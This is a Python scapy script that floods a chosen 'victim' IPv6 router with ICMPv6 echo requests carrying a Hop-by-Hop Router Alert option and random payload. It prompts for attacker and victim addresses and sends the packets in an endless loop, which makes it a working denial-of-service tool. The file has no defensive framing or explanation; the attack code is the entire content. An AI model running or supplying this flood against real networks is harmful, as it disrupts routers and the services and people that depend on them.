#!/usr/bin/python
from scapy.layers.inet6 import IPv6, IPv6ExtHdrHopByHop, RouterAlert, ICMPv6EchoRequest, getmacbyip6
from scapy.layers.l2 import Ether
from scapy.packet import Raw
from scapy.sendrecv import srflood, sendp
from scapy.volatile import RandString


def flood_RouterAlert():
    interface = input(" - Insert the interface, if you skip this by Enter, the packet is automatically "
                      "sent on every active interface: ")
    smac = input(" - Insert the source MAC address, if you skip this by Enter, the MAC address of sender is "
                 "automatically resolved from the source IPv6 address: ")
    sip = input(" - Insert the source (attacker) IPv6 address: ")
    dip = input(" - Insert the destination (victim) IPv6 address: ")
    if smac == "":
        smac = getmacbyip6(sip)
    # Generate packet
    data = Raw(RandString(size=500))
    layer3 = IPv6(src=sip, dst=dip)
    Extension = IPv6ExtHdrHopByHop(options=RouterAlert(value=0)) / \
                ICMPv6EchoRequest(data=data)
    packet1 = Ether(src=smac) / layer3 / Extension
    print("Flooding the router " + dip + " with fake Router Alert messages (press Ctrl C to stop attack)")
    while True:
        try:
            if interface == "":
                sendp(packet1, verbose=False)
            else:
                sendp(packet1, verbose=False, iface=interface)
        except KeyboardInterrupt:
            break


